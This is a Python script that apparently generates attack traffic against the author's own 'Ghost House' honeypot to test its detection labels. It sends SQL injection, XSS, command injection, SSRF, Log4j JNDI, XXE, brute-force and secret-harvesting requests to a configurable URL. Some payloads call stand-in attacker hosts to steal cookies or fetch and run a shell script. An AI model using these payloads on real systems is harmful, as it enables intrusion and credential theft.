import argparse
import csv
from datetime import datetime, timezone
import json
import os
import time
import urllib.error
import urllib.request

DEFAULT_TARGET = "https://6jcln499oi.execute-api.ap-south-1.amazonaws.com/default/ghostHouseDecoy"

MODE_TO_EXPECTED_LABEL = {
    "normal": "benign_probe",
    "brute": "brute_force",
    "scanner": "known_scanner",
    "sqli": "sqli_attempt",
    "xss": "xss_attempt",
    "traversal": "path_traversal",
    "rce": "rce_attempt",
    "ssrf": "ssrf_attempt",
    "log4j": "log4j_jndi",
    "nosql": "nosql_injection",
    "secrets": "secret_harvesting",
    "xxe": "xxe_attempt",
}


def send_request(url, method="GET", data=None, user_agent=None, extra_headers=None):
    start = time.time()
    try:
        headers = {
            "Content-Type": "application/json",
            "User-Agent": user_agent or "GhostHouse-AttackSim/3.0",
        }
        if extra_headers:
            headers.update(extra_headers)

        body = None
        if data is not None:
            if isinstance(data, (dict, list)):
                body = json.dumps(data).encode("utf-8")
            elif isinstance(data, str):
                body = data.encode("utf-8")

        request = urllib.request.Request(
            url,
            data=body,
            headers=headers,
            method=method,
        )

        with urllib.request.urlopen(request, timeout=10) as response:
            elapsed = (time.time() - start) * 1000
            print(f"  [{response.status}] {method:<5} {url} ({elapsed:.0f} ms)")
            return response.status

    except urllib.error.HTTPError as error:
        elapsed = (time.time() - start) * 1000
        print(f"  [{error.code}] {method:<5} {url} ({elapsed:.0f} ms)")
        return error.code

    except Exception as error:
        print(f"  [ERR]   {method:<5} {url} -> {error}")
        return 0


def append_csv_result(mode, payload, expected_label, status_code):
    timestamp = datetime.now(timezone.utc).isoformat()
    row = [timestamp, mode, payload, expected_label, str(status_code or 0)]

    # Write to sim_results.csv in current directory and in tools directory
    script_dir = os.path.dirname(os.path.abspath(__file__))
    targets = {
        os.path.abspath("sim_results.csv"),
        os.path.join(script_dir, "sim_results.csv"),
    }

    for csv_path in targets:
        file_exists = os.path.isfile(csv_path) and os.path.getsize(csv_path) > 0
        with open(csv_path, "a", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            if not file_exists:
                writer.writerow(
                    ["timestamp", "mode", "payload", "expected_label", "http_status"]
                )
            writer.writerow(row)
            f.flush()

    print(
        f"  [CSV LOG] Appended row to sim_results.csv -> (mode={mode}, expected={expected_label}, status={status_code})"
    )


def normal_probe(target):
    print("\n[+] === 1. NORMAL BENIGN PROBE ===")
    payload = '{"username": "testuser", "password": "TestPassword@123"}'
    st = send_request(
        f"{target}/login",
        "POST",
        {
            "username": "testuser",
            "password": "TestPassword@123",
        },
    )
    send_request(f"{target}/dashboard", "GET")
    send_request(f"{target}/api-keys", "GET")
    return payload, st


def brute_force(target):
    print("\n[!] === 2. BRUTE FORCE / CREDENTIAL STUFFING SIMULATION ===")
    passwords = [
        "password123",
        "admin123",
        "test123",
        "welcome123",
        "qwerty123",
        "letmein123",
        "ghost123",
        "password1",
    ]

    last_status = 401
    for pwd in passwords:
        st = send_request(
            f"{target}/login",
            "POST",
            {
                "username": "admin",
                "password": pwd,
            },
        )
        if st:
            last_status = st
        time.sleep(0.25)
    return (
        '{"username": "admin", "password": "password123"} (rapid dictionary brute)',
        last_status,
    )


def scanner(target):
    print("\n[!] === 3. RECONNAISSANCE SCANNER SIMULATION ===")
    paths = [
        "/",
        "/login",
        "/dashboard",
        "/admin",
        "/users",
        "/api-keys",
        "/robots.txt",
        "/.env",
        "/config",
        "/api",
    ]

    last_status = 200
    for path in paths:
        st = send_request(f"{target}{path}", "GET", user_agent="Nikto/2.1.6")
        if path == "/robots.txt" and st:
            last_status = st
        time.sleep(0.2)
    return "GET /robots.txt (Nikto/2.1.6)", last_status


def sqli(target):
    print("\n[!] === 4. SQL INJECTION (SQLi) SIMULATION ===")
    payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin'--",
        "' UNION SELECT NULL, username, password FROM users --",
        "1; DROP TABLE users; --",
        "' UNION SELECT schema_name FROM information_schema.schemata --",
    ]

    rep_payload = "' UNION SELECT NULL, username, password FROM users --"
    last_status = 200
    for payload in payloads:
        st = send_request(
            f"{target}/login",
            "POST",
            {
                "username": payload,
                "password": "test_password",
            },
            user_agent="sqlmap/1.7.2#stable",
        )
        if payload == rep_payload and st:
            last_status = st
        time.sleep(0.25)
    return rep_payload, last_status


def xss(target):
    print("\n[!] === 5. CROSS-SITE SCRIPTING (XSS) SIMULATION ===")
    payloads = [
        "<script>alert('GHOST_HOUSE_XSS')</script>",
        "<img src=x onerror=alert('PWNED')>",
        "\"><svg/onload=fetch('http://attacker.com/steal?c='+document.cookie)>",
        "<iframe src=\"javascript:alert('XSS')\">",
        "javascript:alert(document.domain)",
    ]

    rep_payload = "<script>alert('GHOST_HOUSE_XSS')</script>"
    last_status = 200
    for payload in payloads:
        st = send_request(
            f"{target}/login",
            "POST",
            {
                "username": payload,
                "password": "xss_test_password",
            },
        )
        if payload == rep_payload and st:
            last_status = st
        time.sleep(0.25)
    return rep_payload, last_status


def traversal(target):
    print("\n[!] === 6. PATH TRAVERSAL / LFI SIMULATION ===")
    paths = [
        "/..%2f..%2f..%2fetc/passwd",
        "/../../../../etc/shadow",
        "/.git/config",
        "/.aws/credentials",
        "/windows/win.ini",
        "/../../../../var/log/auth.log",
    ]

    rep_payload = "/..%2f..%2f..%2fetc/passwd"
    last_status = 200
    for path in paths:
        st = send_request(f"{target}{path}", "GET")
        if path == rep_payload and st:
            last_status = st
        time.sleep(0.2)
    return rep_payload, last_status


def rce(target):
    print("\n[!] === 7. REMOTE COMMAND INJECTION (RCE) SIMULATION ===")
    payloads = [
        {"cmd": "; whoami && id"},
        {"cmd": "| uname -a; cat /etc/passwd"},
        {"service": "ping 127.0.0.1; whoami"},
        {"exec": "$(curl http://evil-attacker.com/shell.sh | bash)"},
        {"username": "; cat /etc/shadow", "password": "x"},
    ]

    rep_payload = '{"cmd": "; whoami && id"}'
    last_status = 200
    for payload in payloads:
        st = send_request(
            f"{target}/admin",
            "POST",
            payload,
            user_agent="GhostHouse-RCE-Sim/1.0",
        )
        if payload.get("cmd") == "; whoami && id" and st:
            last_status = st
        time.sleep(0.25)
    return rep_payload, last_status


def ssrf(target):
    print(
        "\n[!] === 8. SERVER-SIDE REQUEST FORGERY (SSRF) / METADATA EXFILTRATION ==="
    )
    targets = [
        f"{target}/api/proxy?url=http://169.254.169.254/latest/meta-data/",
        f"{target}/api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        f"{target}/api/fetch?url=http://127.0.0.1:8080/admin",
        f"{target}/api/webhook?url=http://metadata.google.internal/computeMetadata/v1/",
    ]

    rep_payload = (
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    )
    last_status = 200
    for url in targets:
        st = send_request(url, "GET", user_agent="GhostHouse-SSRF-Sim/1.0")
        if "169.254.169.254" in url and st:
            last_status = st
        time.sleep(0.25)
    return rep_payload, last_status


def log4j(target):
    print("\n[!] === 9. LOG4J / JNDI INJECTION (CVE-2021-44228) SIMULATION ===")
    payloads = [
        "${jndi:ldap://attacker.threat-mesh.org:1389/Exploit}",
        "${jndi:rmi://198.51.100.42:1099/Object}",
        "${jndi:dns://attacker.dnslog.cn/leak}",
        "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.com/x}",
    ]

    rep_payload = "${jndi:ldap://attacker.threat-mesh.org:1389/Exploit}"
    last_status = 200
    for payload in payloads:
        st = send_request(
            f"{target}/login",
            "POST",
            {"username": payload, "password": "test_password"},
            extra_headers={"X-Api-Version": payload, "User-Agent": payload},
        )
        if payload == rep_payload and st:
            last_status = st
        time.sleep(0.25)
    return rep_payload, last_status


def nosql(target):
    print("\n[!] === 10. NOSQL INJECTION SIMULATION ===")
    payloads = [
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$ne": None}, "password": {"$ne": None}},
        {"username": "admin", "password": {"$regex": "^admin.*"}},
        {"$where": "this.password.match(/.*/)"},
    ]

    rep_payload = '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
    last_status = 200
    for payload in payloads:
        st = send_request(
            f"{target}/login",
            "POST",
            payload,
            user_agent="GhostHouse-NoSQL-Sim/1.0",
        )
        if "$gt" in str(payload) and st:
            last_status = st
        time.sleep(0.25)
    return rep_payload, last_status


def secrets_harvest(target):
    print("\n[!] === 11. SENSITIVE SECRET & CONFIG FILE HARVESTING ===")
    secret_paths = [
        "/.env",
        "/.git/config",
        "/.aws/credentials",
        "/config.json",
        "/backup.sql",
        "/id_rsa",
        "/docker-compose.yml",
    ]

    rep_payload = "/.env"
    last_status = 200
    for path in secret_paths:
        st = send_request(
            f"{target}{path}", "GET", user_agent="SecretFinder/2.0"
        )
        if path == rep_payload and st:
            last_status = st
        time.sleep(0.2)
    return rep_payload, last_status


def xxe(target):
    print(
        "\n[!] === 12. XML EXTERNAL ENTITY (XXE) INJECTION SIMULATION ==="
    )
    xml_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>"""

    rep_payload = '<!ENTITY xxe SYSTEM "file:///etc/passwd" >'
    st = send_request(
        f"{target}/api/xml",
        "POST",
        data=xml_payload,
        extra_headers={"Content-Type": "application/xml"},
        user_agent="GhostHouse-XXE-Sim/1.0",
    )
    return rep_payload, st


MODE_HANDLERS = {
    "normal": normal_probe,
    "brute": brute_force,
    "scanner": scanner,
    "sqli": sqli,
    "xss": xss,
    "traversal": traversal,
    "rce": rce,
    "ssrf": ssrf,
    "log4j": log4j,
    "nosql": nosql,
    "secrets": secrets_harvest,
    "xxe": xxe,
}


def execute_single_mode(mode, target):
    handler = MODE_HANDLERS.get(mode)
    if not handler:
        print(f"[-] Unrecognized mode: {mode}")
        return 0

    payload, status = handler(target)
    expected_label = MODE_TO_EXPECTED_LABEL.get(mode, mode)
    append_csv_result(mode, payload, expected_label, status)
    return status


def run_simulation(target, mode, repeat=1, pause=31.0):
    all_modes = [
        "normal",
        "brute",
        "scanner",
        "sqli",
        "xss",
        "traversal",
        "rce",
        "ssrf",
        "log4j",
        "nosql",
        "secrets",
        "xxe",
    ]

    selected_modes = all_modes if mode == "all" else [mode]
    total_runs = repeat * len(selected_modes)
    current_run = 0

    print("\n" + "=" * 65)
    print("      GHOST HOUSE COMPREHENSIVE ATTACK SIMULATION SUITE")
    print("=" * 65)
    print(f"Target Honeypot  : {target}")
    print(f"Mode             : {mode} ({len(selected_modes)} vector(s))")
    print(f"Repeat Count     : {repeat}")
    print(f"Inter-Mode Pause : {pause}s (to prevent rate-rule contamination)")
    print("=" * 65)

    for r in range(1, repeat + 1):
        if repeat > 1:
            print(f"\n==================== ITERATION {r} of {repeat} ====================")

        for idx, m in enumerate(selected_modes):
            current_run += 1
            execute_single_mode(m, target)

            # Pause between modes so the 30-second rate rule doesn't contaminate following modes
            if current_run < total_runs and pause > 0:
                print(
                    f"\n[+] Pausing for {pause}s before next mode (rate-limit window cooling)..."
                )
                time.sleep(pause)

    print("\n" + "=" * 65)
    print("[✓] ALL SIMULATIONS COMPLETED SUCCESSFULLY")
    print("Results logged to sim_results.csv. Check the Ghost House SOC Monitor for live events!")
    print("=" * 65 + "\n")


def interactive_menu():
    print("\n==================================================")
    print("    GHOST HOUSE THREAT DECEPTION ATTACK SUITE")
    print("==================================================")
    target_input = input(
        f"Enter target URL (Press Enter for default: {DEFAULT_TARGET}): "
    ).strip()
    target = target_input.rstrip("/") if target_input else DEFAULT_TARGET

    print("\nSelect Simulation Attack Mode:")
    print("  1.  Normal Probe (Benign)")
    print("  2.  Brute Force / Credential Stuffing")
    print("  3.  Reconnaissance Scanner (Nikto / Directory Probe)")
    print("  4.  SQL Injection (SQLi)")
    print("  5.  Cross-Site Scripting (XSS)")
    print("  6.  Path Traversal / LFI")
    print("  7.  Remote Command Injection (RCE)")
    print("  8.  SSRF & Cloud Metadata Exfiltration")
    print("  9.  Log4j / JNDI Exploit (CVE-2021-44228)")
    print("  10. NoSQL Injection")
    print("  11. Sensitive Secret Harvesting (.env, .git, .aws)")
    print("  12. XML External Entity (XXE)")
    print("  13. Run All (Comprehensive Threat Suite Presentation Demo)")
    print("  0.  Exit")

    choice = input("\nChoice [1-13]: ").strip()

    mode_map = {
        "1": "normal",
        "2": "brute",
        "3": "scanner",
        "4": "sqli",
        "5": "xss",
        "6": "traversal",
        "7": "rce",
        "8": "ssrf",
        "9": "log4j",
        "10": "nosql",
        "11": "secrets",
        "12": "xxe",
        "13": "all",
    }

    if choice in mode_map:
        repeat_in = input("Enter repeat count (default: 1): ").strip()
        repeat = int(repeat_in) if repeat_in.isdigit() and int(repeat_in) > 0 else 1

        pause_in = input("Enter pause seconds between modes (default: 31): ").strip()
        pause = float(pause_in) if pause_in else 31.0

        return target, mode_map[choice], repeat, pause
    else:
        print("Exiting.")
        exit(0)


def main():
    parser = argparse.ArgumentParser(
        description="Ghost House Cloud Honeypot Attack Simulation Tool v3.1"
    )

    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Base URL of your Ghost House deployment (default: {DEFAULT_TARGET})",
    )

    parser.add_argument(
        "--mode",
        choices=[
            "normal",
            "brute",
            "scanner",
            "sqli",
            "xss",
            "traversal",
            "rce",
            "ssrf",
            "log4j",
            "nosql",
            "secrets",
            "xxe",
            "all",
        ],
        help="Simulation mode. If omitted, opens interactive menu.",
    )

    parser.add_argument(
        "--repeat",
        type=int,
        default=1,
        help="Number of times to repeat the simulation run (default: 1)",
    )

    parser.add_argument(
        "--pause",
        type=float,
        default=31.0,
        help="Seconds to pause between modes to prevent rate-rule contamination (default: 31)",
    )

    args = parser.parse_args()

    if not args.mode:
        target, mode, repeat, pause = interactive_menu()
    else:
        target = args.target.rstrip("/")
        mode = args.mode
        repeat = max(1, args.repeat)
        pause = max(0.0, args.pause)

    run_simulation(target, mode, repeat, pause)


if __name__ == "__main__":
    main()